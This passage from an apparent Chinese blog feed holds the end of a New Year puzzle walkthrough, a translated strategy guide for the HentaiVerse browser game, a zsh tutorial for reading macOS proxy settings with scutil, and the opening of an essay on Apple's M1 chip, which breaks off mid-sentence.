alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka's Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\">\n<div>[译] HentaiVerse 建议和指导</div>\n<div><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-12-24</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.3/1.png\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.3/2.png\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\">\n<div>ZSH 自动读取 macOS 系统代理配置并设置环境变量</div>\n<div><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-12-07</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 